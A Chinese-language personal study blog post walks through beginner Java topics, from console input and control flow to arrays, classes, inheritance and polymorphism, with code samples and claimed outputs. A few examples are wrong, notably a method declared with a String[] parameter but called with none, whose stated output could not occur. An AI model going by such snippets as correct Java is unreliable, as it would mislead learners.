title="控制台输入"></a>控制台输入</h2><p>程序在运行的时候 可以在控制台手动录入数据 再让程序继续运行<br>而为了使用这个功能 我们需要导入java预先准备好的包<br>使用方式为 `import 包名.类名;</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">import java.util.Scanner; //导入java包public class test{public static void main(String[] args){Scanner input = new Scanner(System.in); //定义扫描仪System.out.println("请输入用户名:");        String name = input.next();System.out.println("您输入的名字是"+name);}}// 使用Scanner类中对应的方法(区分类型);.nextInt(); //获得整数.nextDouble(); //获得小数.next(); //获得字符串.next().charAt(0); //获得单个字符 0指取第一个位置的数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="作业-将接受的汉字转为对应的编码值并输出"><a href="#作业-将接受的汉字转为对应的编码值并输出" class="headerlink" title="作业:将接受的汉字转为对应的编码值并输出"></a>作业:将接受的汉字转为对应的编码值并输出</h3><p>其实挺简单的 只要在输出的时候使用(int)进行强制转换即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">import java.util.Scanner; //导入java包public class test{public static void main(String[] args){Scanner input = new Scanner(System.in); //定义扫描仪System.out.println("请输入汉字:");    char name = input.next().charAt(0);System.out.println("您输入的字符对应的int值是"+(int)name);}}/*输出：请输入汉字:我您输入的字符对应的int值是25105*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><p>if的结构没啥好讲的 就是根据布尔值进行结果的选择性运行</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">import java.util.*; //用星号可以直接引用所有util下的项 一劳永逸public class testif {    public static void main(String[] args){        Scanner input =new Scanner(System.in);        System.out.println("input number:");        int score = input.nextInt();        if (score&gt;60) {            System.out.println("你合格了");        }else{            System.out.println("你不过关");        }    }}/*输出：input number:65你合格了input number:32你不过关*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="if嵌套-else-if"><a href="#if嵌套-else-if" class="headerlink" title="if嵌套-else if"></a>if嵌套-else if</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">import java.util.*;public class testif {    public static void main(String[] args){        Scanner input =new Scanner(System.in);        System.out.println("input number:");        int score = input.nextInt();    if (score &gt; 100 || score &lt; 0) {        System.out.println("？");    } else if (score == 100) {        System.out.println("满分");    } else if (score &gt;= 90) {        System.out.println("优秀");    } else if (score &gt;= 80) {        System.out.println("良好");    } else if (score &gt;= 60) {        System.out.println("合格");    } else {        System.out.println("你完蛋了");    }    }}/*输出:input number:100满分input number:90优秀input number:80良好input number:60合格input number:53你完蛋了*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要注意在一组 <code>if-else</code> 结构中<strong>只有第一个满足条件的分支会被执行</strong><br>如果某个 <code>if</code> 或 <code>else if</code> 条件为真 其后续的 <code>else if</code> 或 <code>else</code> 将被跳过 和之前的短路机制类似</p><h3 id="嵌套if"><a href="#嵌套if" class="headerlink" title="嵌套if"></a>嵌套if</h3><p>基本就是if里套了个if….</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">import java.util.*;public class testif {    public static void main(String[] args){        Scanner input =new Scanner(System.in);        System.out.println("input number:");        int score = input.nextInt();        if (score==100) {            System.out.println("满分");        }else if(score &lt; 100 &amp;&amp; score &gt;= 90){            System.out.println("优秀");            if(score &gt; 95){                System.out.println("差点满分了");            }else{                System.out.println("还是差点");            }        }else{            System.out.println("？");        }    }}/*输出:input number:95优秀还是差点input number:98优秀差点满分了*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="switch分支结构"><a href="#switch分支结构" class="headerlink" title="switch分支结构"></a>switch分支结构</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">import java.util.*;public class testif {    public static void main(String[] args){        Scanner input =new Scanner(System.in);        System.out.println("input number:");        int score = input.nextInt();        switch (score/10) {            case 10:                System.out.println("牛逼");                break;            case 9:            System.out.println("优秀");            break;            default:            System.out.println("屁嘞");                break;        }    }}/*输出：input number:100牛逼input number:96 优秀*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>整体逻辑 括号里的玩应和case对上了就触发后面的东西 对不上就触发default<br>假如case触发后没有break 则会一路往下继续运行</p><p>注意:switch可判断的类型为 <code>byte short int char String(jdk7以上)</code></p><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">public class HelloWorld{    public static void main(String[] args) {        int i = 1;        while( i&lt;=100 ){            System.out.println("第"+i+"次");            i++;        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>语法:括号里加判断式 大括号加逻辑代码 布尔值为1时 逻辑代码持续运行</p><h2 id="do-while循环"><a href="#do-while循环" class="headerlink" title="do-while循环"></a>do-while循环</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">public class HelloWorld{    public static void main(String[] args) {        int i = 1;        do{            System.out.println("第"+i+"次");            i++;        }while( i&gt;=100 );    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>do-while循环先进行了一次循环操作之后,再进行布尔表达式的判断.<br>即使条件不满足 输出依旧执行了第1次</p><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p>老样子 for后边的括号分三个部分<br>（初始部分（只执行一次）; 循环条件; 迭代部分）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">public class HelloWorld{    public static void main(String[] args) {        for(int i=1;i&lt;=200;i++){            System.out.println("这是"+i);        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="控制循环的语句"><a href="#控制循环的语句" class="headerlink" title="控制循环的语句"></a>控制循环的语句</h2><p>一般是用在循环里来控制循环<br><code>break</code>:终止、跳出switch、循环结构.<br><code>continue</code>:结束本次 进入下一次循环.</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">public class HelloWorld{    public static void main(String[] args) {        for(int i=1;i&lt;=200;i++){            if(i%4 == 0){                continue;            }            if (i == 99) {                break;            }            System.out.println("这是"+i);        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该代码的运行结果是 能被4整除的数字没有输出 输出到98便停止了|</p><h2 id="方法（类似于其它语言中的函数）"><a href="#方法（类似于其它语言中的函数）" class="headerlink" title="方法（类似于其它语言中的函数）"></a>方法（类似于其它语言中的函数）</h2><p>方法需要定义在类的内部 和main方法并列 不允许方法里再定义方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">public class HelloWorld{    public static void main(String[] args) {        for(int i=1;i&lt;=20;i++){            say();        }    }    public static void say(String[] args) {        for(int i=1;i&lt;=5;i++){            System.out.println("这是?"+i);        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出:重复20遍的1-5<br>方法后面的括号可以添加形式参数（等价于局部变量的声明）<br>这样以后在调用这个参数的时候就要在括号里加入对应的实际参数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">public class HelloWorld{    public static void main(String[] args) {        for(int i=1;i&lt;=5;i++){            say(11112);        }    }    public static void say(int word) {        for(int i=1;i&lt;=5;i++){            System.out.println("这是?"+word);        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出: 25遍11112<br>也能通过逗号来传多个参数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">public class HelloWorld{    public static void main(String[] args) {        for(int i=1;i&lt;=5;i++){            say(11112,'啥');        }    }    public static void say(int word,char fuhao) {        for(int i=1;i&lt;=5;i++){            System.out.println("这是"+fuhao+word);        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出:25遍这是啥11112</p><h2 id="return和返回值"><a href="#return和返回值" class="headerlink" title="return和返回值"></a>return和返回值</h2><p>方法所返回的数据类型和具体内容由方法名称前的前一个项决定<br>public static void www() //void指返回空值<br>public static int www() //返回一个int的方法<br>至于返回使用return 数值;语句执行</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">public class HelloWorld{    public static void main(String[] args) {        for(int i=1;i&lt;=5;i++){            int y = say(2,'啥');            System.out.println(y);        }    }    public static int say(int word,char fuhao) {        for(int i=1;i&lt;=5;i++){            word++;        }        return word-1;    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出:返回了五个6<br>有返回的类型必须要保证<strong>在任何情况下</strong>都会返回一个值 不然便会报错<br>return用在void类型的方法中相当于直接终止该方法</p><h2 id="方法调用与递归"><a href="#方法调用与递归" class="headerlink" title="方法调用与递归"></a>方法调用与递归</h2><p>当存在多个方法时 顺序为优先执行方法内部的代码 结束后 返回到调用的地方 再继续往下执行</p><p>递归指的是再方法内部再次调用自身的编程方式 但不正确使用容易出现内存问题</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">public class HelloWorld{    public static void main(String[] args) {        int num= f(10);        System.err.println(num);    }    public static int f(int n) {        return n==1?1:n*f(n-1);    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">public class HelloWorld{    public static void main(String[] args) {int[] a=new int[]{1,2,3,4,5};    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>声明一个数组: <code>数据类型[] 数组名;</code><br>分配数组空间: <code>new 数据类型[长度];</code><br>声明并分配空间:  <code>数据类型[] 数组名 = new 数组类型[长度]</code><br>声明并赋值:<br><code>数据类型[] 数组名 = new 数据类型[]{1,2,3};</code><br><code>数据类型[] 数组名 = {1,2,3};</code> //期间不能换行<br><strong>至于数组的组成 数组中的每个数据格被称为“数组元素”</strong><br><strong>对每个元素进行赋值或取值被称为“元素的访问”</strong><br><strong>访问元素的时候 需要使用“下标”(从0开始,依次+1,自动生成)</strong><br><strong>访问的语法:数组名[下标]; 存数据:a[0] = 10; 取数据 a[0];</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java">public class HelloWorld{    public static void main(String[] args) {        int[] a = new int [5];        a[0]=5;        a[1]=3;        a[2]=4;        a[3]=7;        a[4]=10;        for(int i = 0;i &lt; 5;i++){            System.out.println(a[i]);        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出:依次输出 5 3 4 7 10<br>想表示数组的长度 可以在数组名后加.length</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">import java.util.*;public class HelloWorld{    public static void main(String[] args) {        int[] nums ={2,3,4,5,7,8,9,0,11};        Scanner input =new Scanner(System.in);        System.err.println("请输入一个整数:");        int num = input.nextInt();        boolean flag = false;        for(int i = 0;i &lt; nums.length;i++){            if(nums[i]==num){            System.out.println(i);            flag = true;            break;            }        }    if (flag == false) {        System.err.println(-1);    }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>上式所实现的内容:查看输入的数是否和数组中的元素对应 如果是 输出对应下标 如果不是 输出-1</strong></p><h2 id="数组的扩容"><a href="#数组的扩容" class="headerlink" title="数组的扩容"></a>数组的扩容</h2><p>创建数组时 必须指定长度 并且在创建后不可更改<br>想要实现数组扩容 只能创建一个新的数组并导入旧数据</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">import java.util.Arrays;public class test5{    public static void main(String[] args) {        int[] nums ={11,22,33,44,55};        int[] newints = new int[nums.length*2];        for(int i = 0;i&lt;nums.length;i++){            newints[i]=nums[i];                }        System.err.println(Arrays.toString(newints));        }}// Arrays.toString可以实现将数组转为字符串后输出// 输出： [11, 22, 33, 44, 55, 0, 0, 0, 0, 0]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除去这个比较麻烦的 还有两个更加快捷的方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">System.arraycopy(原数组，原数组起始，新数组，新数组起始，长度);java.util.Arrays.copyOf(原数组，新长度); //返回带有原数值的新数组import java.util.Arrays;public class test5{    public static void main(String[] args) {        int[] nums ={11,22,33,44,55};        int[] newints = new int[nums.length*2];        int[] newints1 = {};        for(int i = 0;i&lt;nums.length;i++){            newints[i]=nums[i];                }        nums = Arrays.copyOf(nums, 100);        System.out.println(Arrays.toString(newints));        System.out.println(Arrays.toString(nums));        }}//前面那个不好使 只用后边的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="数组类型的参数"><a href="#数组类型的参数" class="headerlink" title="数组类型的参数"></a>数组类型的参数</h2><p>当然 数组也能拿去在方法里使用</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">import java.util.Arrays;public class test5{    public static void main(String[] args) {        int[] nums ={1,2,3,4,5};        add(nums);        System.out.println(Arrays.toString(nums));        }    public static void add(int[] nums) {        for(int i=0;i&lt;nums.length;i++){            nums[i] += 1;        }    }}// 输出了{2,3,4,5,6}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="可以变长的参数"><a href="#可以变长的参数" class="headerlink" title="可以变长的参数"></a>可以变长的参数</h2><p>概念:可以接收多个同类型实参 个数不限 使用方式与数组相同<br>语法：数据类型… 形参名 //必须定义在形参列表的最后 且只能有一个</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">import java.util.Arrays;public class test5{    public static void main(String[] args) {        add(1,23,4324,65345,23123);        }    public static void add(int... nums) {        int sum = 0;        for(int i = 0; i &lt; nums.length; i++){            sum += nums[i];        }        System.out.println(sum);    }}// 输出了add中所有数字的和<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><p><img data-src="/3.jpg" alt="3"></p><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><p><strong>什么是对象</strong>（面向对象思想）:</p><ul><li>一切客观存在的事物都是对象, <strong>万物皆对象</strong> .</li><li>任何对象,一定具有自己的 <strong>特征</strong> 和 <strong>行为</strong> .</li></ul><p>特征: 称为属性 一般为名字 代表对象有什么<br>行为:成为方法 一般为动词 代表对象能做什么</p><h2 id="程序中的对象"><a href="#程序中的对象" class="headerlink" title="程序中的对象"></a>程序中的对象</h2><p>如何使用程序模拟现实世界,解决现实问题？</p><ul><li>首先, 在程序当中,必须具有和现实中相同的对象,用以模拟现实世界.</li><li>然后，使用程序中的对象代表现实中的对象,并执行操作,进而解决现实问题.</li></ul><p>这里我们举个例子 创建一个名为 <strong>dog</strong> 的类(class) 为它定义特征(属性)和行为(方法)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">// 这是Dog.java中的内容 声明了如何调用Dog的特征并使用其中的eat sleep行为public class Dog {    String breed;    int age;    String sex;    String color;    public void eat(){        System.out.println("在吃东西");    }     public void sleep(){        System.out.println("在睡觉...");    }}// 以下是调用Dog类的dogtest.java中的内容public class dogtest {    public static void main(String[] args) {        Dog mygo = new Dog();        mygo.breed = "萨摩耶";        mygo.age = 7;        mygo.color = "白";        mygo.sex = "公";        System.out.println(mygo.breed+"\t今年"+mygo.age+"岁\t是"+mygo.sex+"狗\t"+mygo.color+"毛");        mygo.eat();        mygo.sleep();    }}// 声明调用语句: 类名 引用名 = new 类名();// 调用特征: 引用名.特征名 = 值; 相关数据类型在类里已经有定义// 调用行为: 引用名.方法名(); <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当dogtest.java处不给变量赋值的话 会输出默认值<br>int对应0 string对应null double对应0.0 boolean对应false<br><img data-src="/2024/11/23/%E6%90%9E%E7%82%B9java/4.jpg" alt="4"><br>默认值是可以改的 我们在dog.java里为变量赋值就可以了</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">    public void eat(){        String breed="default";        System.out.println(breed+"在吃东西");    } /*输出:null    今年0岁 是null狗        null毛default在吃东西null在睡觉...这样设置的话会优先使用局部变量 要用实例变量需要在变量前加this.*/// dog.java    public void eat(){        String breed="default";        System.out.println(this.breed+"在吃东西");    }// dogtest.java     mygo.breed = "萨摩耶";// 输出萨摩耶  今年7岁 是公狗  白毛    萨摩耶在吃东西萨摩耶在睡觉...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加深印象再举个例子 student</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">// student.javapublic class student {    String name;    int age;    String sex;    int score;    public void sayHi(){        System.out.println(name+"--"+age+"--"+sex+"--"+score);    }}//student5.javapublic class student5 {    public static void main(String[] args) {        student wow = new student();        wow.name = "张三";        wow.age = 14;        wow.sex = "男";        wow.score = 99;        wow.sayHi();    }}//输出张三--14--男--99<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h2><p>通过多个相同名称的方法实现多个过程——例如实现“吃”的多个分支 吃水果 吃蔬菜 吃药</p><h3 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h3><ul><li>方法名称相同</li><li>参数列表不同（类型、个数、顺序）</li><li>与访问修饰符、返回值类型无关</li></ul><p>好处:灵活 方便</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">//代码public class test6 {    public static void main(String[] args) {        test(1);        test("烧烤",2);    }    public static void test(int a) {        System.out.println("吃吃吃！");    }    public static void test(String name,int b) {        System.out.println(name+"也吃吃吃！");    }}//结果吃吃吃！烧烤也吃吃吃！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><p>构造方法是类中的特殊方法,主要用于创建对象.</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点:"></a>特点:</h3><ul><li>名称与类名完全相同</li><li>没有返回值类型</li><li>创建对象时,触发构造方法的调用,不可通过句点手动调用</li></ul><p>注意:如果没有在类中显式定义构造方法,则编译器默认提供无参构造方法</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java">//Person.java代码内容class Person {    String name;    int age;    // 无参构造方法    Person() {        name = "未命名";        age = 0;    }    // 带一个参数的构造方法    Person(String name) {        this.name = name;        age = 0;    }    // 带两个参数的构造方法    Person(String name, int age) {        this.name = name;        this.age = age;    }}//Main.java中的内容public class Main {    public static void main(String[] args) {        Person p1 = new Person();        Person p2 = new Person("Bob");        Person p3 = new Person("Charlie", 30);        System.out.println("p1: " + p1.name + ", " + p1.age);        System.out.println("p2: " + p2.name + ", " + p2.age);        System.out.println("p3: " + p3.name + ", " + p3.age);    }}//输出p1: 未命名, 0p2: Bob, 0p3: Charlie, 30<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h2><p><img data-src="/5.jpg" alt="5"><br>加了this之后 谁在调用当前对象 就套用哪个</p><h2 id="面向对象的三大特性-分装-继承-多态"><a href="#面向对象的三大特性-分装-继承-多态" class="headerlink" title="面向对象的三大特性 分装 继承 多态"></a>面向对象的三大特性 分装 继承 多态</h2><h3 id="什么是封装"><a href="#什么是封装" class="headerlink" title="什么是封装"></a>什么是封装</h3><p>概念:尽可能隐藏对象的内部实现细节 控制对象的修改 访问权限<br>访问修饰符: private (可将属性修饰为私有，仅本类可见)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">//student.java中的内容public class student {    String name;    private int age;    String sex;    double score;    public void setAge(int age){        if(age&gt;=0 &amp;&amp; age&lt;=160){            this.age = age;        }else{            this.age = 18;        }    }    public int getAge(){        return age;    }}//student5.java中的内容public class student5 {    public static void main(String[] args) {        student s1 = new student();        s1.setAge(1000);        System.out.println(s1.getAge());    }}//输出18 //超出范围时 age将被赋值18<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过设置private属性 外界访问将无法直接给private属性赋值 需要通过公共方法来进行</p><h2 id="继承的概念"><a href="#继承的概念" class="headerlink" title="继承的概念"></a>继承的概念</h2><p>假如说要搞很多类 他们都有很多共同的性质 一个一个定义太麻烦了 可以定义一个父类 关键是在类后边使用extends</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">// Pet.java中的内容public class Pet {    String name;    int health;    int love;    public void eat(){        System.out.println(name+"吃东西呢");    }    public String getName(){        return name;    }    public void show(){        System.out.println(name+"-"+health+"-"+love);    }}//Dog.java中的内容public class Dog extends Pet { //表明内容继承自Pet    String breed;    public void sleep(){        System.out.println(breed+"在睡觉...");    }}//test.java中的内容public class test {    public static void main(String[] args) {        Dog d1 = new Dog();        d1.name="修购";        d1.health=99;        d1.love=132;        d1.breed="哈士奇";        d1.sleep();        d1.show();    }}//输出哈士奇在睡觉...修购-99-132<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img data-src="/6.jpg" alt="6"><br>super和this差不多 都是在变量前边加 能够提高优先级<br><img data-src="/7.jpg" alt="7"></p><h2 id="方法的重写"><a href="#方法的重写" class="headerlink" title="方法的重写"></a>方法的重写</h2><p>有的时候父类里定义的方法并没有写的很全 需要再加一些 就可以再进行重写<br>1.重写时访问修饰符的等级必须相等或是放大(父类中方法为protected 子类重写时只能改为protected或public ) 改小会报错<br>2.返回值类型可以和父类一致，也可以是父类返回类型的子类<br>3.方法名必须完全一样<br>4.参数也要注意 不然不是重写而是重载</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">//父类Pet.javapublic class Pet {    String name;    int health;    int love;    public void eat(){        System.out.println(name+"吃东西呢");    }    public String getName(){        return name;    }    public void show(){        System.out.println(name+"-"+health+"-"+love);    }}//子类Dog.javapublic class Dog extends Pet {    String breed;    public void show(){        System.out.println(name+breed+"在睡觉...");    }}//test.javapublic class test {    public static void main(String[] args) {        Dog d1 = new Dog();        d1.name="修购";        d1.health=99;        d1.love=132;        d1.breed="哈士奇";        d1.show();    }}//输出修购哈士奇在睡觉...输出的规则参照了Dog.java而不是Pet.java 说明成功重写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="继承下的构造执行"><a href="#继承下的构造执行" class="headerlink" title="继承下的构造执行"></a>继承下的构造执行</h2><ul><li>在具有继承关系的对象创建中,构建子类对象会先调用父类构造.</li><li>由父类的共性内容,叠加子类的都有内容,组合成完整的子类对象.</li></ul><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>指的是父类引用指向子类对象 从而产生多种形态</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">//父类Pet.javapublic class Pet {    String name;    int health;    int love;    public void show() {        System.out.println(name + "在跳舞");    }}//子类Dog.javapublic class Dog extends Pet {    @Override    public void show() {        System.out.println(name + "在睡觉...");    }}//子类Cat.javapublic class Cat extends Pet {    @Override    public void show() {        System.out.println(name + "在喵喵叫...");    }}//test.javapublic class Test {    // 通过形参实现多态的方法    public static void letPetPerform(Pet pet) {        pet.show(); // 调用实际对象的 show 方法    }    public static void main(String[] args) {        Pet dog = new Dog();        dog.name = "修购";        dog.health = 99;        dog.love = 132;        Pet cat = new Cat();        cat.name = "咪咪";        cat.health = 95;        cat.love = 120;        // 使用形参多态        letPetPerform(dog); // 输出: 修购在睡觉...        letPetPerform(cat); // 输出: 咪咪在喵喵叫...    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h1><blockquote><p>We are just1 another visitor in a transient world.</p></blockquote></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;不多说了 接触点新的语言 指不定用得上呢&lt;br&gt;环境为windows11 java17&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV1994y1r7uV&quot;&gt;跳转&lt;/a&gt;&lt;br&gt;顺便做个学习记录吧&lt;br&gt;&lt;strong&gt;11&amp;#x2F;23&lt;/strong&gt; 17:30 p24完成 19:30 p25完成&lt;br&gt;&lt;strong&gt;11&amp;#x2F;24&lt;/strong&gt; 17:00 p26完成 17:30 p27完成&lt;br&gt;&lt;strong&gt;11&amp;#x2F;25&lt;/strong&gt; p28完成 p29完成 p30完成&lt;br&gt;&lt;strong&gt;11&amp;#x2F;26&lt;/strong&gt; p31完成 p32完成 p33完成 p34完成 p35完成 p36完成&lt;br&gt;p38 p39是教你下软件 这里用idea代替&lt;br&gt;p40 跳过&lt;br&gt;&lt;strong&gt;11&amp;#x2F;27&lt;/strong&gt; p41完成 看p51  到p56&lt;br&gt;&lt;strong&gt;11&amp;#x2F;28&lt;/strong&gt; p56完成  p57完成-p65完成&lt;br&gt;&lt;strong&gt;11&amp;#x2F;29&lt;/strong&gt;  p66完成  p67完成 p68完成-p76-p79完成 p80完成&lt;br&gt;最近学的有点多了 得消化消化 先转移一下注意力吧                                                                                                                                &lt;/p&gt;
&lt;p&gt;ps:大学竟然今后只学c++ 这下白搭了&lt;/p&gt;</summary>
    
    
    
